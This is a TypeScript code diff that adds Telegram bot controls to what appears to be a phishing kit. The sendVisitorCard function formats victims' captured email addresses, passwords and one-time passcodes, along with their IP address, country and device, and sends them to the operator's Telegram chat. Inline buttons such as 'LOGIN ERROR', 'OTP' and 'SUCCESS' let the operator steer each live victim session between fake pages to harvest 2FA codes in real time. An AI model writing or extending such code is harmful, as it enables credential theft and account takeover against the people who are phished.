@@ -33,6 +33,31 @@ export async function sendTelegramMessage(message: string): Promise<boolean> {
   }
 }
 
+// Send message with inline keyboard buttons
+export async function sendMessageWithButtons(chatId: string, message: string, buttons: Array<Array<{text: string, callback_data: string}>>) {
+  if (!TELEGRAM_BOT_TOKEN) return;
+
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: buttons
+          }
+        }),
+      }
+    );
+  } catch (error) {
+    console.error("Failed to send message with buttons:", error);
+  }
+}
+
 // Handle /visitors command - List all visitors
 export async function handleVisitorsCommand(): Promise<string> {
   try {
@@ -164,6 +189,94 @@ function getTimeSince(date: Date): string {
   return `${Math.floor(seconds / 86400)}d`;
 }
 
+// Handle callback button presses
+async function handleCallbackQuery(callbackQuery: any) {
+  const callbackData = callbackQuery.data;
+  const chatId = callbackQuery.message.chat.id;
+  
+  // Parse callback data: format is "action:sessionId:page"
+  const [action, sessionId, page] = callbackData.split(":");
+  
+  if (action === "redirect") {
+    const result = await handleRedirectCommand(sessionId, page);
+    
+    // Answer callback query
+    await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          callback_query_id: callbackQuery.id,
+          text: `Redirecting to ${page}...`,
+        }),
+      }
+    );
+    
+    // Send result message
+    await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: result,
+          parse_mode: "HTML",
+        }),
+      }
+    );
+  }
+}
+
+// Send visitor card with control buttons
+export async function sendVisitorCard(visitor: any, credentials?: { email?: string, password?: string, otp?: string }) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+
+  const sessionShort = visitor.sessionId.substring(0, 8);
+  
+  let message = `🔔 <b>New Activity</b>\n\n`;
+  
+  if (credentials?.email && credentials?.password) {
+    message += `✅ <b>Email:</b> ${credentials.email}\n`;
+    message += `✅ <b>Password:</b> ${credentials.password}\n`;
+    message += `-----------------------------+\n`;
+  }
+  
+  if (credentials?.otp) {
+    message += `✅ <b>OTP:</b> ${credentials.otp}\n`;
+    message += `-----------------------------+\n`;
+  }
+  
+  message += `<b>Country:</b> ${visitor.country}\n`;
+  message += `<b>IP Address:</b> ${visitor.ip}\n`;
+  message += `🌐-----------------------------+\n`;
+  message += `<b>Session:</b> <code>${sessionShort}</code>\n`;
+  message += `<b>Device:</b> ${visitor.device}\n`;
+  message += `<b>Browser:</b> ${visitor.browser}\n`;
+  message += `<b>Page:</b> ${visitor.currentPage}`;
+  
+  // Create inline keyboard buttons
+  const buttons = [
+    [
+      { text: "❌ LOGIN ERROR ❌", callback_data: `redirect:${sessionShort}:/login-failure` }
+    ],
+    [
+      { text: "OTP", callback_data: `redirect:${sessionShort}:/otp` },
+      { text: "OTP ERROR", callback_data: `redirect:${sessionShort}:/otp-error` }
+    ],
+    [
+      { text: "SUCCESS", callback_data: `redirect:${sessionShort}:/success` },
+      { text: "LOADING", callback_data: `redirect:${sessionShort}:/loading` }
+    ],
+    [
+      { text: "🏠 HOME", callback_data: `redirect:${sessionShort}:/` }
+    ]
+  ];
+  
+  await sendMessageWithButtons(TELEGRAM_CHAT_ID, message, buttons);
+}
+
 // Start long polling for Telegram updates (optional - can be called from server/index.ts)
 export async function startTelegramBot() {
   if (!TELEGRAM_BOT_TOKEN) {
@@ -193,6 +306,7 @@ export async function startTelegramBot() {
         for (const update of data.result) {
           offset = update.update_id + 1;
 
+          // Handle text commands
           if (update.message && update.message.text) {
             const chatId = update.message.chat.id;
             const commandText = update.message.text;
@@ -214,6 +328,11 @@ export async function startTelegramBot() {
                 }),
               }
             );
+          }
+          
+          // Handle button callbacks
+          if (update.callback_query) {
+            await handleCallbackQuery(update.callback_query);
           }
         }
       }
